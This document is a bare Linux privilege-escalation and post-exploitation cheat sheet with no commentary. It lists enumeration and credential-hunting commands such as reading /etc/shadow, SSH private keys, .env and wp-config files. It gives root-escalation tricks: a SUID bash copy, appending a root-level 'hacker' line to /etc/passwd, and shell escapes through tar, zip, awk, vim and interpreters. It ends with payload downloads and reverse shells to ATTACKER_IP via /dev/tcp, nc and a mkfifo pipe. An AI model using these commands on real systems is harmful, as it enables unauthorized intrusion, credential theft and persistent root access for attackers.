```
id
whoami
hostname
uname -a
cat /etc/os-release
cat /etc/issue
env
printenv
echo $PATH
echo $SHELL
history

sudo -l
sudo -V

cat /etc/passwd
cat /etc/shadow
cat /etc/group
getent passwd
getent group
groups
last
w
who

find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
find / -user root -perm -002 -type f 2>/dev/null
find / -user root -perm -002 -type d 2>/dev/null

find / -name "*.conf" 2>/dev/null
find / -name "*.config" 2>/dev/null
find / -name "*.bak" 2>/dev/null
find / -name "*.old" 2>/dev/null
find / -name "*.log" 2>/dev/null
find / -name "*password*" 2>/dev/null
find / -name "*pass*" 2>/dev/null
find / -name "*cred*" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name ".bash_history" 2>/dev/null

grep -Ri "password" /etc 2>/dev/null
grep -Ri "passwd" /etc 2>/dev/null
grep -Ri "user" /etc 2>/dev/null
grep -Ri "pass" /var/www 2>/dev/null
grep -Ri "password" /var/www 2>/dev/null
grep -Ri "DB_PASSWORD" /var/www 2>/dev/null
grep -Ri "SECRET_KEY" /var/www 2>/dev/null

ls -la
ls -la /
ls -la /home
ls -la /root
ls -la /tmp
ls -la /var/tmp
ls -la /dev/shm
ls -la /opt
ls -la /srv
ls -la /var/www
ls -la /etc
ls -la /etc/sudoers
ls -la /etc/sudoers.d
ls -la /etc/cron*
ls -la /var/spool/cron
ls -la /var/spool/cron/crontabs

cat /etc/sudoers
cat /etc/crontab
cat /etc/cron.d/*
cat /var/spool/cron/crontabs/*
cat /var/spool/cron/*

ps aux
ps auxww
ps -ef
top
pstree -a

netstat -tulpn
netstat -ano
ss -tulpn
ss -ano
ip a
ip route
route -n
arp -a

systemctl list-units --type=service
systemctl list-timers
systemctl status SERVICE
service --status-all

ls -la /etc/systemd/system
ls -la /lib/systemd/system
find /etc/systemd/system -writable 2>/dev/null
find /lib/systemd/system -writable 2>/dev/null

cat /etc/fstab
mount
df -h
lsblk
blkid

docker --version
docker ps
docker ps -a
docker images
docker info
groups
ls -la /var/run/docker.sock

lxc image list
lxc list
lxd init

capsh --print
getcap -r / 2>/dev/null

find / -type f -name "*.service" -exec ls -la {} \; 2>/dev/null
find / -type f -name "*.timer" -exec ls -la {} \; 2>/dev/null

find / -type f -perm -o+w 2>/dev/null
find / -type d -perm -o+w 2>/dev/null
find / -type d -perm -o+w -not -path "/proc/*" 2>/dev/null

ls -la ~/.ssh
cat ~/.ssh/id_rsa
cat ~/.ssh/authorized_keys
cat ~/.ssh/known_hosts

cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.python_history

ls -la /var/backups
ls -la /backup
ls -la /backups
find / -name "*.tar" 2>/dev/null
find / -name "*.tar.gz" 2>/dev/null
find / -name "*.zip" 2>/dev/null
find / -name "*.7z" 2>/dev/null

dpkg -l
rpm -qa
snap list

which gcc
which cc
which python
which python3
which perl
which ruby
which nc
which netcat
which wget
which curl
which bash
which sh

crontab -l
sudo crontab -l

journalctl
journalctl -u SERVICE
dmesg

ls -la /var/log
cat /var/log/auth.log
cat /var/log/syslog
cat /var/log/messages
cat /var/log/secure

mysql -u root
mysql -u root -p
psql -U postgres

cat /var/www/html/config.php
cat /var/www/html/wp-config.php
cat /var/www/html/.env
cat /var/www/.env
cat /opt/*/.env

find / -name ".env" 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
find / -name "config.php" 2>/dev/null
find / -name "database.php" 2>/dev/null
find / -name "settings.py" 2>/dev/null

sudo -u root /bin/bash
sudo /bin/bash
sudo /bin/sh
sudo -u root vim
sudo -u root find . -exec /bin/sh \; -quit

find . -exec /bin/sh -p \; -quit
bash -p
sh -p

cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p

echo 'root:password' | chpasswd

echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd
openssl passwd -1 -salt salt password

tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
awk 'BEGIN {system("/bin/sh")}'
find / -exec /bin/sh \; -quit
vim -c ':!/bin/sh'
less /etc/passwd
more /etc/passwd
man man

python3 -c 'import os; os.system("/bin/sh")'
python -c 'import os; os.system("/bin/sh")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
lua -e 'os.execute("/bin/sh")'

gcc exploit.c -o exploit
chmod +x exploit
./exploit

wget http://ATTACKER_IP/file -O file
curl http://ATTACKER_IP/file -o file
python3 -m http.server 8000
busybox httpd -f -p 8000

nc -lvnp 4444
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
nc ATTACKER_IP 4444 -e /bin/sh
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo
reset
```
